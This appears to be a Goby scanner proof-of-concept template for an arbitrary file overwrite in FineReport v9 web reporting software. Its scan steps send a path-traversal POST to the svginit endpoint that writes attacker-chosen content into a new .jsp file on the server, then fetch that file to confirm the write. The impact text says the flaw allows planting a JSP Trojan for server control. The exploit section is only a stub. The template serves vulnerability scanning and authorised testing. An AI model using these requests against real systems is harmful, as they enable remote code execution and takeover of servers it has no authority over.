{
      "Name": "FineReport v9 Arbitrary File Overwrite",
      "Level": "3",
      "Tags": [
            "overwrite"
      ],
      "GobyQuery": "app=\"fanruansem-FineReport\"",
      "Description": "FineReport is an web reporting tool.",
      "Product": "fanruan-FineReport",
      "Homepage": "https://www.fanruan.com/",
      "Author": "",
      "Impact": "Since there is no restriction on the incoming parameters when initializing the svg file, data can be overwritten to the existing file, so that the server permission can be obtained by writing the Trojan into the jsp file.",
      "Recommendation": "",
      "References": [
            "https://github.com/NHPT/WebReportV9Exp/blob/main/WebReport_Exp.py"
      ],
      "HasExp": true,
      "ExpParams": null,
      "ExpTips": {
            "Type": "",
            "Content": ""
      },
      "ScanSteps": [
            "AND",
            {
                  "Request": {
                        "method": "POST",
                        "uri": "/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/a.svg.jsp",
                        "follow_redirect": false,
                        "header": {
                              "Content-Type": "application/json"
                        },
                        "data_type": "text",
                        "data": "{\"__CONTENT__\":{{{str1}}},\"__CHARSET__\":\"UTF-8\"}",
                        "set_variable": [
                              "str1|rand|str|7"
                        ]
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
                        "output|lastbody|regex|"
                  ]
            },
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/WebReport/a.svg.jsp",
                        "follow_redirect": false,
                        "header": null,
                        "data_type": "text",
                        "data": "",
                        "set_variable": []
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "{{{str1}}}",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
                        "output|lastbody|regex|"
                  ]
            }
      ],
      "ExploitSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/test.php",
                        "follow_redirect": true,
                        "header": null,
                        "data_type": "text",
                        "data": "",
                        "set_variable": []
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "test",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
                        "output|lastbody|regex|"
                  ]
            }
      ],
      "PostTime": "0000-00-00 00:00:00",
      "GobyVersion": "0.0.0"
}